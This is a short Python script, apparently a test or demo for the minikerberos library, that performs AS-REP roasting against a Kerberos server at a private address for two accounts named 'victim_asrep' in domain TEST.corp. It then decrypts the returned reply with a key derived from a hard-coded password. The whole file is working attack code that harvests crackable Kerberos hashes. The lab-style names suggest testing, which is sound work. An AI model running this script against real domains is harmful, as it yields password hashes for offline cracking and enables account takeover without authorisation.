from minikerberos import KerberosCredential, KerberosTarget, KerberosSocket, KerbrosComm
from minikerberos.security import APREPRoast
from minikerberos.encryption import _enctype_table, Key
from minikerberos.asn1_structs import EncASRepPart
import hashlib



ccred = KerberosCredential()
ccred.username = 'victim_asrep'
ccred.domain = 'TEST.corp'

ccred2 = KerberosCredential()
ccred2.username = 'victim_asrep2'
ccred2.domain = 'TEST.corp'

creds = [ccred, ccred2]

ks = KerberosSocket('192.168.9.1')

ar = APREPRoast(ks)
res = ar.run(creds)

rep = res[0]
print(res)

x,a,enctype,checksum,data = rep.split('$')

password = 'Almaalmaalma!1'
cipher = _enctype_table[int(enctype)]
key = Key(int(enctype), hashlib.new('md4', password.encode('utf-16-le')).digest())
cipherText = bytes.fromhex(checksum+data)
temp = cipher.decrypt(key, 3, cipherText)
print()
print()
print(temp.hex())
enc_as_rep_part = EncASRepPart.load(temp).native
#print(enc_as_rep_part)